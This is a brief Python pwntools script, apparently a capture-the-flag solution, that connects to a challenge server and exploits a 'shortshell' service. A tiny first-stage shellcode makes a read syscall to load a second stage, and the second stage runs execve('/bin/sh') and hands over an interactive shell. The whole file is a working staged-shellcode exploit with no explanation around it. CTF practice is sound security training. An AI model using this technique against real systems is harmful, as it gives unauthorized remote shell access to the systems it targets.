from pwn import *

context.arch = 'amd64'

r = remote('csie.ctf.tw', 10122)
#r = process('./shortshell-ff4e0ca6f9f10bb0a52b0820e3e82dbc')

a = asm("""
    	nop
    	mov edx, 0x27
    	xor edi, edi
    	syscall
    	"""
)

r.send(a)

a = asm("""
	mov rdi, 0x68732f6e69622f
	mov rax, 0x68732f6e69622f
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 59
	syscall
    	"""
)

time.sleep(2)

r.send(a)
r.interactive()
